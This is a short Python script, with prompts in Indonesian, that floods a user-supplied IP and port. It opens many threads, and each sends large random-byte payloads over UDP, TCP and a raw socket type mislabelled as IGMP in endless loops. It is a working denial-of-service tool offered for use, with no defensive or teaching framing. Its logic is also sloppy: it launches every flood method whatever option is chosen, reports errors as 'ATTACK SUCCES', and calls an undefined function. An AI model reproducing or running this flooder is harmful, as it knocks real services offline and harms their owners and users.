
import random
import socket
import threading
import time
import os

os.system("cls")
os.system("clear")

print(" WARNING !! Jika Error Threads dan Packets nya Harus Di Bawah 500")
ip = str(input(" IP : "))
port = int(input(" Port (80/3389) : "))
times = int(input(" Packtes (500) or (90048) : " ))
threads = int(input(" Threads (500) or (90048) : " ))
method = str(input(" Method (TCP/UDP/IGMP) : "))

def run():
	data = random._urandom(60024)
	i = random.choice(("[-]","[+]","[#]","[*]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"CONNECT ")
		except:
			print(i +"ATTACK SUCCES ")

for y in range(threads):
		th = threading.Thread(target = run)
		th.start()
        
def ig():
	data = random._urandom(1024)
	i = random.choice(("[-]","[+]","[#]","[*]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_RDM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"CONNECT")
		except:
			print(i +"ATTACK SUCCES ")

for y in range(threads):
		th = threading.Thread(target = ig)
		th.start()
        
def run2():
	data = random._urandom(600000)
	i = random.choice(("[-]","[+]","[#]","[*]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"CONNECT ")
		except:
			print(i +"ATTACK SUCCES ")

for y in range(threads):
		th = threading.Thread(target = run2)
		th.start()
        

if method == "TCP":
   run2()
if method == "UDP":
   run()
if method == "IGMP":
   ig()
else:
   print(" ERROR METHOD TRY AGAIN ")
   time.sleep(5)
   stop()
